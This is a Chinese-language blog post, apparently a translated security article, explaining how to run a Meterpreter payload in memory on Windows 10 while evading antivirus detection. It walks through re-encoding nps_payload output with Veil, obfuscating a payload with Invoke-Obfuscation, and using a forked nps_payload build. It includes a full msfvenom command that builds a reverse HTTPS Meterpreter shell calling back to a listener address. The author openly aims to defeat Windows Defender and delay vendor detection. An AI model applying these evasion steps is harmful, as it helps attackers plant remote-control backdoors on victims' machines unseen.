> 原文链接: https://www.anquanke.com//post/id/148340 


# win10内存执行meterpreter绕过杀软第二弹


                                阅读量   
                                **118769**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t010e7ba8610bc198ab.png)](https://p1.ssl.qhimg.com/t010e7ba8610bc198ab.png)

坎宁汉姆的定律是这样的：“在互联网上获得正确答案的最好方法并不是去问一个问题，而是发布一个错误的答案”。

[![](https://p5.ssl.qhimg.com/t01b0f3a1a0a5a97151.png)](https://p5.ssl.qhimg.com/t01b0f3a1a0a5a97151.png)

然而，自从我发布上篇博文《win10内存花式执行meterpreter绕过杀软》后却没有收到负面反馈，不过我自己已经发现了一些问题：

以下是我目前为止发现的：

<!-- [if !supportLists]-->l  <!--[endif]-->绝大多数杀软使用默认配置就能检测到nps_payload，因为它在后端使用了msfvenom来生成可执行的powershell代码。

<!-- [if !supportLists]-->l  <!--[endif]-->从webDAV上获取文件对磁盘并不是“零写入的”，在C:WindowsServiceProfilesLocalServiceAppDataLocalTempTfsStoreTfs_DAV这个目录中你可以找到一些内容。

<!-- [if !supportLists]-->l  <!--[endif]-->Msbuild也不是零写入的，执行的时候会在C:Users[USER]AppDataLocalTemp[RANDOM]写入一些内容。不过，跟webDAV不一样，执行之后它会自我清理。

好消息是我可以修复第一个问题，下面是修复的步骤：



## 使用Veil

假设你已经安装了Veil，并且使用nps_payload生成了msbuild_nps.xml文件。

使用下面的参数运行Veil：

[![](https://p1.ssl.qhimg.com/t015ec2e3c43eb7abc9.png)](https://p1.ssl.qhimg.com/t015ec2e3c43eb7abc9.png)

执行后你会得到一个payload.bat文件。根据靶机架构不同，我们会复制相对应的命令。下面我对x64架构进行了高亮显示。

[![](https://p5.ssl.qhimg.com/t01f93c2dcd61165a73.png)](https://p5.ssl.qhimg.com/t01f93c2dcd61165a73.png)

在上面的这段payload中，需要删除”位置处的转义字符 （有两处）。

这种转义在Windows命令行中是需要的，但是我们要进行的操作并不需要。

现在需要进行base64编码。一种简单的编码方式是复制到一个文件中，运行如下命令：

[![](https://p1.ssl.qhimg.com/t01fef448bcaff8de38.png)](https://p1.ssl.qhimg.com/t01fef448bcaff8de38.png)

复制base64输出内容，替换掉msbuild_nps.xml文件中的cmd命令。确保不要覆盖了闭合引号和分号。

[![](https://p3.ssl.qhimg.com/t01a0dd6ee529c02e0a.png)](https://p3.ssl.qhimg.com/t01a0dd6ee529c02e0a.png)

现在你可以再次运行nps_payload，选择option4，将你的filename.txt作为输入：自定义PS1脚本。

 这就OK了，告别烦人的Windows Defender。



## 使用Invoke-Obfuscation

首先，在一个有powershell的系统上获取Invoke-Obfuscation.运行在你自己的系统上，而不是靶机。

Windows Defender又会跳出来拦截你的操作：

[![](https://p0.ssl.qhimg.com/t01a2189bf8c04b1c17.png)](https://p0.ssl.qhimg.com/t01a2189bf8c04b1c17.png)

在我这个例子中，最终还是得以执行。

为了获得初始的powershell脚本，你可以像执行nps-payload脚本一样使用msfvenom:

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.137.134 LPORT=443 –arch x86 –platform win -f psh -o msf_payload.txt

[![](https://p4.ssl.qhimg.com/t01f53421fd261a4ffe.png)](https://p4.ssl.qhimg.com/t01f53421fd261a4ffe.png)

我使用了python的简单http server模块，通过http方式传到主机上。这将帮助我们更好的把它插入到Invoke-Obfuscation中。

使用Invoke-Obfuscation，我们需要利用的powershell脚本如下：

[![](https://p2.ssl.qhimg.com/t01b6c7dc8fc73bfa7f.png)](https://p2.ssl.qhimg.com/t01b6c7dc8fc73bfa7f.png)

选择任意方法进行混淆，这里我选择“Token All”

[![](https://p0.ssl.qhimg.com/t0154b67b483c7b97b6.png)](https://p0.ssl.qhimg.com/t0154b67b483c7b97b6.png)

执行后可以得到如下内容：

[![](https://p4.ssl.qhimg.com/t01b7ecfa816cc42a87.png)](https://p4.ssl.qhimg.com/t01b7ecfa816cc42a87.png)

这就是你的powershell脚本。当你执行invoking，选择option4自定义PS1脚本时，你可以把它作为一个新文件插入这个脚本到nps-payload中。



## 使用Franci Šacer的nps-payload版本

先去GitHub上下载他的版本：[https://github.com/fsacer/nps_payload](https://github.com/fsacer/nps_payload)

选择“Generate msbuild/nps/msf CSharp payload”

[![](https://p1.ssl.qhimg.com/t018e6a8aa60a2998be.png)](https://p1.ssl.qhimg.com/t018e6a8aa60a2998be.png)

按照上面的步骤执行。这种方式根本没使用powershell，所以不会像使用其他方式一样被检测到。

我感觉这是所有方法中最好的一种，所以我把它放到最后，是想延长微软开始对它进行检测的时间。

因为我一放出这种方式，微软肯定会有所行动。



审核人：yiwang   编辑：边边
